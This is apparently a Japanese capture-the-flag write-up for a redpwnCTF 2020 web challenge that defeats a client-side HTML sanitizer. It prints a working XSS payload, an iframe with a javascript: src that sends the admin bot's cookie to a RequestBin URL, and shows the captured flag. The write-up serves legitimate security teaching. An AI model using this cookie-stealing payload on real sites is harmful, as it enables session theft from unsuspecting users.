# # <!--XXXXXXXXXX-->
Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me [here](https://admin-bot.redpwnc.tf/submit?challenge=static-static-hosting)  
Site: [static-static-hosting.2020.redpwnc.tf](https://static-static-hosting.2020.redpwnc.tf/)  
Note: The site is entirely static. Dirbuster will not be useful in solving it.  

# Solution
ターゲットサイトとAdmin Botへ巡回命令を出せるサイトが与えられる。  
Static Static Hosting  
[site1.png](site/site1.png)  
Static Static Hosting Admin Bot Submission  
[site2.png](site/site2.png)  
入力によりユーザがページを作成できるようだ。  
そのページをAdmin Botに渡し、XSSでクッキーを抜く可能性が高い。  
作成したページでのXSSを試み、[RequestBin.com](https://requestbin.com/)で待ち受ける。  
作成したページでは以下のスクリプト(script.js)が動いていた。  
```JavaScript:script.js
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.documentElement.innerHTML = clean(input);
}

function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
}

function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```
どうやらsrcは許されているようだがonerrorなどは使用できないようだ。  
srcで思い出すのがiframeでのXSSだ。  
以下のようにタグを書き込める。  
```html
<iframe src="javascript:window.location.href='https://[RequestBinURL]?get='+document.cookie">
```
普段はbase64をかませたものを使用しているが、今回はAdmin Botの仕様上動かなかった。  
作成されたページをAdmin Botに渡すとflagが得られる。  
```text
GET/?get=flag=flag{wh0_n33d5_d0mpur1fy}
```

## flag{wh0_n33d5_d0mpur1fy}